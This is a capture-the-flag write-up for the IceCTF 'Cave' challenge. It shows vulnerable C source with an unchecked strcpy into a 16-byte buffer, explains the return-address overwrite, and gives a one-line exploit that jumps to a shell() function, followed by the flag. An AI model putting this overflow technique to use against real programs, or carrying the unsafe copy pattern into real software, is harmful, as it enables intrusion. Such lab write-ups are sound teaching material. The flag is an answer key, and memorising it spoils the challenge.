# Cave - Binary Exploitation
**Author** : Rakshith G

>You stumbled upon a cave! I've heard some caves hold secrets.. can you find the secrets hidden within its depths?

```C
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

void shell() {
    gid_t gid = getegid();
    setresgid(gid, gid, gid);
    system("/bin/sh -i");
}

void message(char *input) {
    char buf[16];
    strcpy(buf, input);

    printf("The cave echoes.. %s\n", buf);
}

int main(int argc, char **argv) {
    if (argc > 1){
        message(argv[1]);
    } else {
        printf("Usage: ./shout <message>\n");
    }
    return 0;
}
```

This is a classic buffer overflow problem. By overflowing the buffer, we need to change the return address of the function `message()` to `shell()`. A simple disassembly in gdb reveals the return address of the `message()` and the start address of `shell()` function. Also, we can see that the stack size is 32 bytes. So, the first 28 bytes of the buffer can be filled with anything but the last 4 bytes need to be the address of the `shell()` function. On inspection, we find the address to be `0x0804850b`.

Overwriting the return address in little endian, we get the root shell which we can use to read `flag.txt`.

```python
./shout `python -c "print('x'*28+'\x0b\x85\x04\x08')"`
```

>IceCTF{i_dont_think_caveman_overflowed_buffers}